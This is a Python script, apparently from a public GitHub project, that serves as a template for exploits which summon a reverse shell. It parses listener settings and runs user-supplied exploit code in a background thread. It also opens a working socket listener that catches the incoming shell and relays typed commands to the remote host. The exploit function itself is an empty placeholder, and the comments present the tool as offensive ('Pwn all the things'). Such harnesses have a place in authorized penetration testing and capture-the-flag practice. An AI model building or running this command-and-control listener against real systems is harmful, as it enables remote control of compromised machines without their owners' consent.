# 
# Python PoC Framework
# By Robin van den Hurk
# 
# License: 
#  No idea. Just don't use it for anything that could be concidered commercial 
#  without explicit permission from the original developer.
#  Otherwise, give credit where credit is due; Please leave a link to the GitHub
#  repo: https://github.com/RobinvandenHurk/python-poc-framework
# 
# TL;DR:
#  1) Add your existing exploit code in the exploit() function
#  2) Add any necessary command line arguments in the parse_arguments() function
#  3) Modify your exploit code to use the arguments using the 'args' variable
#  4) Pwn all the things
# 
# Description:
#  This little script is designed to easily and quickly build an exploit that 
#  summons a reverse shell. Simply add your existing exploit code into the 
#  exploit() function, add any required arguments in the parse_arguments()
#  function and modify your exploit code to use them.
# 
#  Once started, the script takes care of creating a listener and running the
#  exploit
#

import requests
from random import randrange
import socket, sys, time
import threading
import argparse

# 
# This function validates the passed arguments and exits if (some of) the arguments are invalid
# 
def parse_arguments():
  parser = argparse.ArgumentParser(description='Autopwner')
  parser.add_argument('--listenInterface', dest='listen_interface', help='Interface to listen on')
  parser.add_argument('--listenIP', dest='listen_ip', help='IP address to listen on')
  parser.add_argument('--listenPort', dest='listen_port', type=int, help='Port to listen on (Default: random)', default=randrange(2000, 4000))

  # Add your own arguments here
  # parser.add_argument('--targetHost', dest='target_host', help='Target host')
  # parser.add_argument('--targetPort', dest='target_port', help='Target port')
  # parser.add_argument('--username', dest='username', help='Username for the platform')
  # parser.add_argument('--password', dest='password', help='Password for the platform')

  args = parser.parse_args()

  if args.listen_ip is None and args.listen_interface is None:
    print('Specify either --listenInterface or --listenIP')
    exit(1)

  if args.listen_ip is not None and args.listen_interface is not None:
    print('Specify either --listenInterface or --listenIP')
    exit(1)

  if 'listen_interface' in args:
    import netifaces as ni
    try:
      interface = ni.ifaddresses(args.listen_interface)
      args.listen_ip = interface[ni.AF_INET][0]['addr']
    except Exception as e:
      print('[-] Interface not found')
      exit(1)

  return args

# 
# This function runs the exploit code. Your custom exploit code goes inside this function
# 
def exploit(args):
  # Insert your exploit code here
  # Use the args variable to get the command line arguments
  print("[!] Exploit has not been implemented!")
  print("[+] Waiting for callback...")

# 
# This function ensures that the exploit() function runs without blocking the code, so 
#  that we can listen for an incoming connecting while the exploits is running in the background
# 
def run_exploit(args):
  thread = threading.Thread(target=exploit, args=(args, ), kwargs={})
  thread.start()

# 
# This function is responsible for catching the reverse shell
# 
def listen(ip, port):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.bind((ip, port))
  s.listen(1)
  print(f"[+] Started listener on {ip}:{str(port)}")
  conn, addr = s.accept()
  print(f"[+] Received reverse shell from {addr[0]}")

  while True:
      command = input(f"# ")
      command += "\n"

      conn.send(command.encode())
      time.sleep(1)

      response = conn.recv(1024)
      print(response.decode())

args = parse_arguments()

# Start the exploit in the background
run_exploit(args)
# Listen for incoming connections in the foreground
listen(args.listen_ip, args.listen_port)
